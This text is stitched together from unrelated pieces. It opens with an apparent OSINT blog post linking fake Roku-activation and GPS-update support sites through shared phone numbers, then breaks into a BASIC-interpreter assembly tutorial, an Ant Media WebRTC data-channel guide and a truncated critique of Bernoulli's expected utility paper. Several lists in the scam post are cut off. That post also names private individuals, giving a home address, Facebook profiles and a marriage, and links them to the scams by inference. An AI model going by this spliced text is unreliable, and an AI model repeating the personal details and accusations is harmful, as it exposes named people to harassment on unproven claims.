<p>When I started to unravel this operation, what caught my eye was a single phone number. A <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.scammer.info/d/36984-888-990-4266-roku-activation">post on Scammer.info</a> and <a rel="nofollow noopener noreferrer" target="_blank" href="https://bobrtc.tel/numbers/d/888-990-4266-tech-support-scam">BobRTC</a> confirmed that <code>+1 888 990 4266</code> appear to be associated with Roku activation scams.</p>
<p>Then, a little research revealed that <code>+1 888 990 4266</code> is associated with two suspicious sites:</p>
<ul>
<li><code>rockstreamingmedia.com</code> (more about this later); and</li>
<li><code>cliqmediastream.com</code> (from the contact us page).</li>
</ul>
<div>
<p><a href="https://osint.fans/assets/images/cliqmediastream-contact-us.png" data-lightbox="identical-phone-numbers-linking-cliqmediastream-com-and-rockstreamingmedia-com-together" data-title="The top bar of cliqmediastream.com features +1 888 990 4266." data-alt="The top bar of cliqmediastream.com features +1 888 990 4266.">

<a href="https://osint.fans/assets/images/rockstreamingmedia-contact-us.png" data-lightbox="identical-phone-numbers-linking-cliqmediastream-com-and-rockstreamingmedia-com-together" data-title="Rokku Streaming Media also features +1 888 990 4266." data-alt="Rokku Streaming Media also features +1 888 990 4266.">

</a></p><figcaption>Identical phone numbers linking cliqmediastream.com and rockstreamingmedia.com together.</figcaption>
</div>
<p>Interestingly, <code>cliqmediastream.com</code> features two phone numbers. The top bar of <code>cliqmediastream.com</code> says the contact number is <code>+1 866 920 2601</code>. A little Google research reveals that <code>+1 866 920 2601</code> is also associated with a Roku scam running at <code>streamprosetup.com</code>, a similar site offering similar streaming device support and registration services.</p>
<div>
<figure>
<a href="https://osint.fans/assets/images/cliqmediastream-website.png" data-lightbox="did-cliqmediastream-com-forget-to-change-1-866-920-2601-in-the-top-bar" data-title="Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?" data-alt="Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?">

</picture>
</a>
<figcaption>Did cliqmediastream.com forget to change +1 866 920 2601 in the top bar?</figcaption>
</figure>
</div>
<p>The conclusion is that <code>cliqmediastream.com</code>, <code>rockstreamingmedia.com</code> and <code>streamprosetup.com</code> all belong to the same circle because of the identical phone numbers.</p>
<h3 id="going-down-the-rabbit-hole">Going down the rabbit hole</h3>
<p>Let’s dig into other details now. The company address listed on <code>streamprosetup.com</code> is <code>2810 Crossroads Drive, Suite 4011, Madison, WI-53590</code>, which is a boring office block.</p>

<p>It turns out that a large number of sites posing as Roku support also feature the same address in Madison for one reason or the other:</p>
<div><div><pre><code>ashstreamservices.com
byarvitsolutions.com
linkmediasetup.com
roku-tvactivation.com
rokutvactivation.com
setupstreamingdevice.com

</a></p><figcaption>No matter what linking code is entered, the activation process always fails.</figcaption>
</div>
<p>The similarities do not stop here. I found a handful of other websites having similarities with each other. For example, the Privacy Policy, the (fake) service description and/or other textual blurbs are identical on these sites indicating that these sites belong to the same circle.</p>
<div><div><pre><code>activatestreamingdevices.com

</code></pre></div></div>
<h3 id="branching-off-to-gps-software-update-scams">Branching off to GPS software update scams</h3>
<p>Interestingly, one of the domains at <code>streamysticks.online</code> features an Australian phone number: <code>+61 025 104 0010</code>.</p>
<p>It turns out the same phone number is featured on websites associated with Garmin and TomTom software update scams:</p>

<h2 id="are-these-websites-tied-to-a-us-company">Are these websites tied to a US company?</h2>
<p>Remember <code>rockstreamingmedia.com</code> from the beginning? The name of the company running this site – according to the Cancellation Policy page – is <strong>Rokku Streaming Media LLC</strong>.</p>

<figcaption>rockstreamingmedia.com claims its Rokku Streaming Media LLC is running the website.</figcaption>

</div>
<p>After digging into a handful of public company registers, it appears that a similarly named company <strong>Rokku Streaming Media Services LLC</strong> is registered in the office block at <code>2810 Crossroads Drive, Suite 4033, Madison, WI-53718</code> (very similar address featuring on the fake Roku sites from above). Is this a coincidence and someone is merely abusing the details of a legitimate company?</p>
<p>According to the company documents, Rokku Streaming Media Services LLC is providing <strong>Custom Computer Programming Services</strong> and the sole owner is <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.facebook.com/AAaulkah">Ms Gagandeep K Mangat</a>. Ms Mangat named <code>254 Moorland Place, Sun Prairie, WI 53590</code> as her contact address on the company register.</p>
<p>According to a <a rel="nofollow noopener noreferrer" target="_blank" href="https://urlscan.io/result/41b103dd-aa42-4907-9d9b-7cc30e74c05f/">public property directory</a>, Ms Mangat lives with a person named <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.facebook.com/japtej.singh.7">Japtej Aulakh</a> in Sun Prairie.</p>

<figcaption>Public records show that Ms Mangat and Ms Aulakh live together.</figcaption>

</div>
<p>After the careful analysis of the public posts of the Facebook profiles of Ms Mangat, <strong>Mr Aulakh is the husband of Ms Mangat</strong>, and the Sun Prairie address also from the company register is the couple’s home.</p>
<h3 id="further-companies">Further companies</h3>
<p>Ms Mangat runs two more companies named <strong>Divergent Group and Companies Inc.</strong> (divergentgroups.com) and <strong>Pro Tech Mind, LLC</strong> according to public records.</p>
<p>The latter company, Pro Tech Mind is <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.protechmind.com/">offering TV and home entertainment installation services</a> according to the website. Ms Mangat also appears to be associated with a similar company called <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.hellotech.com/">HelloTech</a>.</p>
<p>Interestingly, the same three employees work for both companies and they are called by different names.</p>

</a></p><figcaption>Are these employees identical twins?</figcaption>
</div>
<p>In parallel, the husband – Mr Aulakh – also manages a company named <strong>Cultivate Group LLC</strong>.</p>
<p>Each of the corporate entity is specialising in <strong>Custom Computer Programming Services</strong> according to the public records, just like Rokku Streaming Media LLC.</p>

<p>It is always exciting to have a new gadget at home. However, one should exercise great care when it comes to the initial setup and activation of the device. Scammers are setting up fake tech support sites and gaming the Google search results to get your money.</p>
<p>To avoid being scammed, always follow the on-screen instructions of your streaming device and never take shortcuts by doing a Google search for the setup page. If you are stuck, call the official tech support number of Roku or your streaming device brand.</p>
<p>What happens when a victim calls up one these support numbers? Here is an amusing video from Kitboga about his experience with a fake Roku tech support scam:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s funny the rabbit holes one ends up. One of my personal projects for several years has been the creation (exploration, really) of a “fake emulator” — that is, an emulator for a computer that never existed all written in JavaScript. Instead, the machine would pay homage to the eight and sixteen bit machines of the 1980s and ‘90s.</p>
<p>I like to do things the hard way, though: this machine would also be based on a novel instruction set as well. The instruction set would be similar to that of the era, but also be a little easier to use. And so, <a href="https://github.com/kerrishotts/retroputer" rel="noopener nofollow noreferrer">Retroputer</a> was born. Over several years, the implementation has been built out and improved, although it’ll probably never be “complete” (it’s a personal exploration, after all).</p>
<p>Then @bbcmicrobot became a thing, and I wanted to be able to do a similar thing for Retroputer. My JS development skills are mostly in the arena of the front-end, and so this would be a cool way to get some more back-end skills. One problem: Retroputer could only understand its own assembly language. It had no BASIC support yet.</p>
<p>And so here I am, building a BASIC interpreter, ‘80s style — that is, entirely in assembly language, just like it used to be done. And I thought I’d share that journey, since it’s not often we delve into areas so far from our typical abstractions. My daily driver (JavaScript) makes a lot of things trivial and sometimes those things feel magical. Understanding the lowest levels of the process can often help with understanding those abstractions.</p>
<p>And so… let’s begin.</p>
<h2 id="parsing-in-low-level-assembly-language">Parsing in Low-Level Assembly Language</h2>
<p>When I wrote the assembler for Retroputer, I was able to use a really nice tool called Pegjs. This made quick work of the assembler’s custom syntax, but was unfortunately there’s nothing like it for Retroputer ASM.</p>
<p>Which means we have to do it the hard way.</p>
<p>Parsing actually occurs in multiple phases. A language that uses a compiler parses the code into an abstract syntax tree (or similar concept), and can then use that tree to generate the resulting native code. A consequence of this is that the program must be syntactically correct in order for the compilation to be successful.</p>
<p>Some interpreters today also have this concept because it’s often useful to generate the intermediate AST and execute from there than it is to execute from the original source.</p>
<p>But for a BASIC interpreter in a machine with limited resources, the most resource-effective way to parse is to do it in multiple phases — some of which occurs at run time. This means, however, that syntax errors often can’t be detected until the program is run and the area of code with the error is encountered.</p>
<p>The three phases of Retroputer BASIC parsing are as follows:</p>
<ol>
<li>Line Transformation</li>
<li>Tokenization</li>
<li>Runtime Syntax Checking</li>
</ol>
<p>The first two steps occur as the user enters a program (or loads one). The last one occurs while the program is running. Essentially, the first two build out the rough scaffolding of an airplane, but with no guarantee of flight. The last step is essentially acting as a test pilot — hoping you’ll get off the ground, but not knowing until you try.</p>
<p>Thankfully Retroputer BASIC doesn’t come with such dire consequences for raising an error during runtime.</p>
<p><em><strong>Note:</strong></em> Source code (in progress) for Retroputer BASIC is <a href="https://github.com/kerrishotts/retroputer/tree/master/asm/kernel/basic" rel="noopener nofollow noreferrer">available on GitHub</a>.</p>
<h2 id="line-transformation">Line Transformation</h2>
<p>This is the easiest part of the entire process. Essentially, the line that the user enters is converted to uppercase so that later processes are easier (and faster). BASIC is not sensitive to case, and so we can use that to our advantage.</p>
<pre><code>print 2+2
' becomes:
PRINT 2+2
</code></pre>
<p>Doing this in JavaScript is easy, right?</p>
<pre><code>theLine = theLine.toUpperCase();
</code></pre>
<p>But in assembly language, we have to be more detailed about how things get done. We need to read in a character, convert it to uppercase, and then store it somewhere.</p>
<pre><code>           ld  y,  0                # y is our index
_loop:     ld  al, [d, x, y]        # [d,x] is pointer to string
           cmp al, 97               # is al (char) in range?
           brs n   _continue        # Not a lowercase char; continue
           cmp al, 123              # high portion
           brs !n  _continue        # not a lowercase char; continue
           and al, 0b1101_1111      # uppercase!
           st  [d, x, y], al        # store back (we modify the original)
_continue: inc y                    # move our index along
           cmp al, 0                # check for NULL
           brs !z _loop             # No? Go back for more.
</code></pre>
<p>The above doesn’t quite match the same semantics as the JavaScript version. One important difference is that we now use Unicode to work with text, and so converting input from lowercase to uppercase can often be more difficult — and maybe impossible (depending on the language). Retroputer lives in the world of ASCII (rather, it’s own variation, named RetSCII), meaning that all supported characters are encoded into eight bits. This is woefully inadequate for many languages, but also true to the period.</p>
<p>It also means that we can use a nice feature of ASCII to convert from lowercase to uppercase. It turns out that uppercase “A” is represented with <code>65</code> in ASCII, and lowercase “a” is represented with <code>97</code>. If you’re familiar with your powers-of-two, that difference should catch your eye.</p>
<p>So it turns out that lowercase letters are represented with a number that’s exactly 32 above the uppercase letter. Once we know something’s in range, all we need to do is subtract 32!</p>
<p>That works, but we could just do some bit twiddling. For Retroputer this wouldn’t actually be any faster than subtraction, but avoiding subtraction means we don’t have to worry about the carry/borrow flag during arithmetic. It turns out we can use a bitwise <code>and</code> to turn off the bit for the 32 place value instead.</p>
<pre><code>and al, 0b1101_1111         # turn off bit in 32-place
# versus
clr c                       # clear carry
sub al, 32                  # subtract 32
</code></pre>
<p>But there’s a catch: not <em>everything</em> can be converted to uppercase. If the user has included a string literal, for example, we have to be more careful. After all, we don’t want Retroputer BASIC to scream at the user all the time, right? (Although many computers of the era didn’t have lowercase capability, Retroputer doesn’t share that same limitation.)</p>
<p>For example:</p>
<pre><code>print "Hello, World!"
' should become:
PRINT "Hello, World!"
' and not
PRINT "HELLO, WORLD!"
</code></pre>
<p>This means we need to keep track of whether or not we’re in the middle of a string literal. In BASIC, there’s only one signifier for this: the double quote. If we check if a character is a double quote, we can set a flag, and depending on the flag’s value, we can perform an uppercase operation or leave things alone.</p>
<p>It turns out that in JavaScript there’s no built-in to accomplish this, but we can build one:</p>
<pre><code>const len = theLine.length;
let insideString = false;
for (let i = 0; i &lt; len; i++) {
    const ch = theLine[i];
    if (ch === `"`) insideString = !insideString;
    if (!insideString) {
        const newCh = ch.toUpperCase();
        if (ch !== newCh) theLine[i] = newCh;
    }
}
</code></pre>
<p>Now the logic of the JS more closely matches that of the assembly version, although we’re taking advantage of JS’s unicode support a bit more.</p>
<p>The assembly version looks like this:</p>
<pre><code>           ld  y,  0                # y is our index
           ld  bl, 0                # === insideString (false)
_loop:     ld  al, [d, x, y]        # [d,x] is pointer to string
           cmp al, 34               # is al a double quote?
           brs !z  check_char       # no? should we uppercase it?
           xor bl, 0xFF             # yes? toggle insideString
_check_char:
           cmp bl, 0xFF             # inside a string?
           brs z   _continue        # yes? don't modify it
           cmp al, 97               # is al (char) in range? "a"
           brs n   _continue        # Not a lowercase char; continue
           cmp al, 123              # high portion           "z"
           brs !n  _continue        # not a lowercase char; continue
           and al, 0b1101_1111      # uppercase!
           st  [d, x, y], al        # store back (we modify the original)
_continue: inc y                    # move our index along
           cmp al, 0                # check for NULL
           brs !z _loop             # No? Go back for more.
</code></pre>
<p>So far all we’ve done is transform the input text to uppercase, but there’s one extra benefit here in the way we’ve had to track if we’re inside a string. We can do one round of syntax checking here!</p>
<p>If, at the end of the process we find that <code>inString</code> is still true (<code>bl = 0xFF</code>), we can trigger an error, because it means that there’s an unterminated string literal somewhere in the line.</p>
<p><em><strong>Side note:</strong></em> It turns out many BASICs are quite lenient when it comes to terminating quotes for strings. One of many things I learned while building my own interpreter. Even so, it doesn’t feel right to me, and so Retroputer BASIC doesn’t permit it.</p>
<h2 id="tokenization">Tokenization</h2>
<p>The next phase of parsing involves converting an entered line into something more efficient for Retroputer BASIC to execute. This is as close to the concept of an abstract syntax tree that we’ll get here — the result will definitely not be a tree. But it will be something that we can quickly evaluate during runtime.</p>
<p>One common feature of early microcomputers was a very limited memory capacity. Retroputer has more memory than most machines of the time had by default, but it still has much less than modern machines. As such, long BASIC programs could easily consume far too much memory if they were stored as the user typed them.</p>
<p>To save space, keywords are <em>tokenized</em> as the program is entered into memory. This process converts keywords into single-byte tokens. Keywords are always at least two bytes long, and so this savings can add up. It also means that we can use a lookup table during execution to call the appropriate assembly language routines.</p>
<p>Retroputer BASIC goes a little further than most BASICs of the time, …</p></div></div>

<p>With the release of version 2.0, Ant Media Server Enterprise Edition supports WebRTC Data Channel standard and previously we posted 3 blog posts related to setup, usage and implementation of Data Channels with Ant Media Server EE:</p>
<ul>
<li><a href="https://antmedia.io/exchange-data-easily-using-webrtc-data-channels/">How to Exchange Data Easily Using WebRTC Data Channels with Ant Media Server</a></li>
<li><a href="https://antmedia.io/webrtc-chat-and-file-transfer/">WebRTC Chat and File Transfer Done Easily with Ant Media Server – Part 1</a></li>
<li><a href="https://antmedia.io/webrtc-chat-and-file-transfer-2/">WebRTC Chat and File Transfer Done Easily with Ant Media Server – Part 2</a></li>
</ul>
<p><a href="https://antmedia.io/exchange-data-easily-using-webrtc-data-channels/"></a>Our last blog post on this topic will be about sending control messages like actions and events through WebRTC Data Channels and about best practices when creating more interactive and complex applications through usage of these. We will examine 2 use case scenarios with some example usages from our Javascript and Android SDKs and try to make them more understandable for our customers.</p>
<p>Sending all kind of events or actions through data channels is the most convenient and secure way to implement interactive applications with WebRTC. Low latency and secure communication through Data Channels can be useful especially in case of interactive applications like in conferences, in e-learning or in some games where each participant has a certain role and allowed to do certain types of actions and can trigger certain events.</p>
<p><img src="https://antmedia.io/wp-content/uploads/2020/06/raising_hand-300x169.gif" alt="Build powerful interactive WebRTC Data Channel Applications with Actions and Events 1" width="423" height="238" srcset="https://antmedia.io/wp-content/uploads/2020/06/raising_hand-300x169.gif 300w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-1024x576.gif 1024w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-768x432.gif 768w, https://antmedia.io/wp-content/uploads/2020/06/raising_hand-600x338.gif 600w" sizes="(max-width: 423px) 100vw, 423px" title="Build powerful interactive WebRTC Data Channel Applications with Actions and Events 1"></p>
<p>For example in an e-learning application, a student can raise hand to ask a question and the teacher can decide to accept this request or reject it. If the request is accepted, the teacher and the other students will start playing the video stream of that student.</p>
<p>A similar scenario can also be realized for video conference applications of companies where the manager can allow employees to speak if requested during a presentation. Similarly voting on a subject during conferences or e-learning, communicating certain events like muted microphones, alerting or poking other users or sending game commands and events during WebRTC games can all be easily implemented through Data Channels.</p>
<h2>Message Format and Protocol</h2>
<p>As mentioned in <a href="https://antmedia.io/webrtc-chat-and-file-transfer/">our blog related to chat application</a>, we recommend sending events or user actions as structured data in JSON or XML. For most of the applications parsing them with common JSON or XML parsers in the receiver side would be enough but for complex applications having a validation schema like XML Schema or JSON Schema for these events can be useful and less error prone when validating, parsing, mapping them.</p>
<p>An example event in JSON format which are sent through data channel to all conference participants in our <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank"><em>conference.html</em> </a>&nbsp;page when someone mutes his microphone looks like this:</p>
<pre><span>{
"streamId": "stream1",
"eventType": "MIC_MUTED"
}</span></pre>
<p>For more complex applications some kind of communication protocol is needed to manage the possible interactions between different users or the system. When designing such protocols for interactive and reactive applications, it is very important to clearly specify and examine what actions and events a user with a certain role can generate and which other states these events can lead to. In such cases, UML Sequence diagrams can be helpful to document and design the communication scenarios and UML State diagrams can help to handle all edge and use cases which are dependent on different states and roles. Next we will talk about a simple use case related conferences.</p>
<h3>Use Case: WebRTC Video Conference Events</h3>
<p>In latest version of our <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank"><span><em>conference.html</em> </span></a>and <span><em>ConferenceActivity</em></span> in our WebRTC Android SDK, when a conference attendee mutes or unmutes his microphone or enables or disables his video stream for publishing, <a href="#Message_Format_and_Protocol">a special event message like in section above</a> is sent to the all the other conference participants, through WebRTC Data Channel. Then all other stream participants parse the received event and based on the event type the developer can customize the <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank">conference.html</a> to notify the users or show an icon on the corresponding streams.</p>
<p>In Web side when the event receives the <span>“data_received”</span> signal in callback function is called:</p>
<pre><span>... else if(info == "data_received") { handleNotificationEvent(obj); }</span></pre>
<p>which then handles different notification events based on the event type:</p>
<pre><span>function handleNotificationEvent(obj) {</span>
<span>&nbsp; &nbsp; console.log("Received data : ", obj.event.data);</span>
<span>&nbsp; &nbsp; var notificationEvent = JSON.parse(obj.event.data);</span>
<span>&nbsp; &nbsp; if(notificationEvent != null &amp;&amp; typeof(notificationEvent) == "object") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; var eventStreamId = notificationEvent.streamId;</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; var eventTyp = notificationEvent.eventType;</span>

<span>&nbsp; &nbsp; &nbsp; &nbsp; if(eventTyp == "CAM_TURNED_OFF") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Camera turned off for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; } else if (eventTyp == "CAM_TURNED_ON") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Camera turned on for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;} else if (eventTyp == "MIC_MUTED") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Microphone muted for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;} </span><span>else if (eventTyp == "MIC_UNMUTED") {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log("Microphone unmuted for : ", eventStreamId);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;}</span>
<span>&nbsp; &nbsp;}</span>
<span>}</span></pre>
<p>In this case for simplicity, it only logs them to the console. In Android in the <em><span>ConferenceActivity</span> <span>onMessage</span></em> method the notification events are handled analogously with Toast messages:</p>
<pre><span>public void onMessage(DataChannel.Buffer buffer, String dataChannelLabel) {</span>
<span>&nbsp; &nbsp; ByteBuffer data = buffer.data;</span>
<span>&nbsp; &nbsp; String strDataJson = new String(data.array(), StandardCharsets.UTF_8);</span>

<span>&nbsp; &nbsp; try {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;JSONObject json = new JSONObject(strDataJson);</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;String eventType = json.getString("eventType");</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;String streamId = json.getString("streamId");</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;Toast.makeText(this, eventType + " : " + streamId, Toast.LENGTH_LONG).show();</span>
<span>&nbsp; &nbsp; } catch (Exception e) {</span>
<span>&nbsp; &nbsp; &nbsp; &nbsp;Log.e(getClass().getSimpleName(), e.getMessage());</span>
<span>&nbsp; &nbsp; }</span>
<span>}</span></pre>
<p>Please check our <a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank"><span>conference.html</span></a> page in Web and <span>ConferenceActivity</span> in our Android WebRTC SDK to better understand how these messages are produced and handled.</p>
<h3>Use Case: Raising Hand in E-Learning</h3>
<p>A more complex case would be a student raising hand to ask a question in an E-learning application.</p>
<p>In our <span>hypothetical </span>scenario, multiple students can send raise hand messages approximately in the same time through WebRTC Data Channel and after that the teacher should decide to accept one of their requests or reject their requests. So the answer of the teacher should reference the unique stream id of the sender of the <span>RaiseHandRequest</span> which he accepted or rejected. If he accepts a request he will send accept message to everybody and the student whose request is accepted will automatically start publishing his video stream and the others will play it.</p>
<div id="attachment_30087"><p><img aria-describedby="caption-attachment-30087" src="https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-1024x784.png" alt="WebRTC Raise Hand UML Sequence Diagram" width="1024" height="784" srcset="https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-1024x784.png 1024w, https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-300x230.png 300w, https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-768x588.png 768w, https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-1536x1176.png 1536w, https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-2048x1568.png 2048w, https://antmedia.io/wp-content/uploads/2020/06/SequenceRaiseHand-1-600x459.png 600w" sizes="(max-width: 1024px) 100vw, 1024px" title="Build powerful interactive WebRTC Data Channel Applications with Actions and Events 2"></p><p id="caption-attachment-30087">UML Sequence Diagram of Raise Hand *</p></div><p>We are not showing here how to implement different roles for the students and teacher but one way to achieve this is for example having different customized versions of <span><a href="https://github.com/ant-media/Ant-Media-Server/wiki/WebRTC-Conference-Call" rel="nofollow noopener" target="_blank">conference.html</a></span> and <span>ConferenceActivity</span> for teacher and students. We can add also following constraint to our scenario; while a student is asking a question, no other student can request to ask any questions. To implement this constraint the state information can be stored in each participants with following possible states:</p>
<ol>
<li>Teaching</li>
<li>Question_Session_Empty</li>
<li>Question_Session_Full</li>
</ol>
<p>So the students can only ask questions when state is <span>Question_Session_Empty</span> and when state is <span>Question_Session_Full,</span>&nbsp;nobody can raise hand to ask questions. In our scenario the coordinator of the state will be the teacher and in edge case where a student is temporarily disconnected and reconnects, the current state should be sent to him by the teacher. (Another option is teacher sending the state regularly as some kind of keep alive message.)</p>
<p>In this scenario an example <span>RaiseHandRequest</span> request in JSON format would look like this:</p>
<pre><span>{</span>
<span>"senderId":"student1",</span>
<span>"eventType":"RaiseHandRequest",</span>
<span>"eventTime": 1592602900,</span>
<span>"description":"Question Related to Lesson 1"</span>
<span>}</span></pre>
<p>And a positive answer to his request from the teacher would look like this:</p>
<pre><span>{</span>
<span>"senderId":"teacher1",</span>
<span>"eventType":"RaiseHandAccept",</span>
<span>"eventTime": 1592602986,</span>
<span>"answerToRequest": "student1",</span>
<span>"description":"You have only 1 minute to ask"</span>
<span>}
</span></pre>
<p>After receiving this, the <span>student1</span> would start publishing his video stream and the others would start playing it.</p>
<p>In this blog post, we tried&nbsp; to inform our customers about some possible example use cases and the best practices when implementing interactive applications with WebRTC Data Channels. Here we talked about relatively simple use cases but an exciting variety of interactive and complex projects can be implemented using WebRTC Data Channels and Ant Media Server SDKs.&nbsp; We want to guide the developers when they are implementing their amazing and feature-rich projects using our SDKs.</p>
<p>Please be advised the methods and design decisions described here are not complete and not the only way to implement this kind of solutions. The design best suited to your needs can be a different one based on your requirements.<br>
<span>conference.html</span> and <span>ConferenceActivity</span> are included in&nbsp;our sample projects and WebRTC Data Channels are available to our customers with our Web, Android and IOS SDKs in version 2.0.<br>
If you have any questions, please drop a line to contact@antmedia.io.</p>
<h4 lang="zxx">Notes:</h4>

		<p>Not all academic fields have a clear starting point, a seminal paper that constitutes the foundation of the entire discipline. But economics does. The paper that defines modern formal economics was written by Daniel Bernoulli in 1738. It introduces expected utility theory. The main thrust of our work is, of course, to replace expected utility theory and instead work with time-average growth rates of wealth. I’ll mention how that works, but the focus of this post will be on something else. Bernoulli’s paper is not only conceptually misleading but also technically flawed in a sneaky way that keeps confusing everyone. Where Bernoulli determines the price to be paid for a risky prospect, he contradicts himself. I wouldn’t make such a fuss about this if the paper wasn’t so absolutely crucial. This basis of economics contains an error that invalidates commonly held beliefs and puts tens of thousands of studies into a different light. I recently <a href="https://twitter.com/ole_b_peters/status/963084568831119361">encouraged people, using twitter,</a> to read the paper and see for themselves. In this blog post I go through the relevant analysis step by step and address questions that came up in response to the tweet.</p>

<h2>Preliminaries</h2>
<p>Bernoulli’s paper was re-published in 1954 in <a href="https://www.econometricsociety.org/publications/econometrica/1954/01/01/exposition-new-theory-measurement-risk">Econometrica</a> (if you don’t like paywalls, here’s a <a href="http://bit.ly/2nShXn5">free pdf</a>). This is the standard translation from Latin, and page numbers below refer to it. I have not read the original Latin paper, but the error is spelled out in words, visually in a figure, and also in an equation, so this is not something lost in translation. If you have a copy of the original, please send it to me. <em>[2018-02-18 addendum: a scan of the original is <a href="https://archive.org/details/SpecimenTheoriaeNovaeDeMensuraSortis" target="_blank" rel="noopener">here</a>.]</em> The paper is so fundamental to economics that more than 200 years after its publication it was fished out of the proceedings of the Papers of the Imperial Academy of Sciences in Petersburg (Vol. V, 1738, pp. 175-192), translated into English, and published in the leading journal of the field.</p>
<h2>What is expected utility theory?</h2>
<p>Expected utility theory (EUT) is a form of decision theory. Imagine someone offers you a lottery ticket. Prior to Bernoulli, it was assumed that people roughly maximize the expected change in wealth resulting from such a gamble. That is, if initial wealth is <img src="https://s0.wp.com/latex.php?latex=x%28t%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x(t)" title="x(t)"> and possible changes in wealth are <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> then you’d maximize</p>
<p>(Eq.1)&nbsp;&nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+x%28t%2B%5Cdelta+t%29+-+x%28t%29+%5Crangle+%3D+%5Clangle+%5Cdelta+x%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle x(t+\delta t) - x(t) \rangle = \langle \delta x\rangle" title="\langle x(t+\delta t) - x(t) \rangle = \langle \delta x\rangle">.</p>
<p>Here, <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Ccdot+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \cdot \rangle" title="\langle \cdot \rangle"> is the expectation operator. Some people like to denote it by <img src="https://s0.wp.com/latex.php?latex=%5Cmathbb%7BE%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\mathbb{E}" title="\mathbb{E}"> but it’s same thing. If <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+x%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta x\rangle" title="\langle \delta x\rangle"> is positive, you’d buy the ticket, if it’s negative, you wouldn’t. But observations soon convinced everyone that this is not how people behave.</p>
<p>EUT was introduced as a refinement of this decision criterion. It says that you will choose the action that maximizes the expected change, not of your wealth but of your utility. The insight here is that people don’t evaluate gambles in isolation but with respect to a reference level (their initial wealth). An extra dollar is worth less to me if I’m rich than if I’m poor. Mathematically, a so-called utility function <img src="https://s0.wp.com/latex.php?latex=u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)" title="u(x)"> is introduced, where <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x"> represents wealth.</p>
<p>The most commonly used utility function is <img src="https://s0.wp.com/latex.php?latex=u%28x%29%3D%5Clog+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)=\log x" title="u(x)=\log x">. This is motivated by assuming that the extra utility someone attaches to an extra dollar is inversely proportional to the wealth that that someone already has, p.25:</p>

<p>Later on Bernoulli writes this assumption as the differential equation <img src="https://s0.wp.com/latex.php?latex=du+%3D+1%2Fx+dx&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="du = 1/x dx" title="du = 1/x dx">, whose solution is the logarithm. Let’s write down what EUT wants us to maximize:</p>
<p>(Eq.2) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Clangle+%5Cln%5Bx%28t%2B%5Cdelta+t%29%5D-%5Cln%5Bx%28t%29%5D+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u \rangle = \langle \ln[x(t+\delta t)]-\ln[x(t)] \rangle" title="\langle \delta u \rangle = \langle \ln[x(t+\delta t)]-\ln[x(t)] \rangle">.</p>
<h3>What’s our conceptual critique?</h3>
<p>By re-writing this object you will immediately see that it actually means something else, and that’s the essence of our conceptual critique. Logarithms turn division into subtraction, <img src="https://s0.wp.com/latex.php?latex=%5Cln%28a%2Fb%29%3D%5Cln+a+-%5Cln+b&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\ln(a/b)=\ln a -\ln b" title="\ln(a/b)=\ln a -\ln b">. So (Eq.2) can be re-written as</p>
